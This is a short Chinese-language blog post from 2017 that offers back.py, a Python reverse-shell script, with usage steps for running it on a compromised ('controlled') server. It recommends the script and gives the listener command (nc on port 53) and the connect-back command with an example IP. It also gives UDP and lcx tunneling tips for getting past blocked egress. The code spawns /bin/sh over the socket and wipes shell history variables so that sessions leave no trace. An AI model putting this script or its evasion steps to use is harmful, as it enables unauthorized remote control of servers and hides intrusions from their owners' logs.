---
title: back.py反弹shell
date: 2017-09-11 17:50:57
tags: 
    - 渗透
    - 内网
    - Python
categories: 渗透
---

back.py会自动去掉各种history记录，确保shell断掉的时候不会被记录到bash_history里面，而且反弹也稳定不会断，推荐使用

<!-- more -->


back.py会自动去掉各种history记录，确保shell断掉的时候不会被记录到bash_history里面，而且反弹也稳定不会断，推荐使用
使用方法：back.py 你本地监听的IP 端口 [udp]

首先本地使用nc监听：nc -l -vv -p 53

然后被控服务器执行：back.py 114.113.112.111 53即可

如果不行，请确定服务器53端口能出去（测试方法就是ping百度，看看能否解析出地址）。或者先使用lcx监听，再本地用nc连接lcx。

udp是为了突破某些连53端口都出不去时的情景，也不全成功，udp传输的话会不稳定，不多说了上代码


``` python
# -*- coding:utf-8 -*-

#!/usr/bin/env python
"""
back connect py version,only linux have pty module
code by google security team
UDP by anthrax@insight-labs.org
"""
import sys,os,socket,pty
shell = "/bin/sh"
def usage(name):
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port> [udp]' % name

def main():
    if len(sys.argv) <3:
        usage(sys.argv[0])
        sys.exit()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if sys.argv[3]=='udp':
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    except:pass
    try:
        s.connect((sys.argv[1],int(sys.argv[2])))
        print 'connect ok'
    except:
        print 'connect faild'
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()

if __name__ == '__main__':
    main()
```


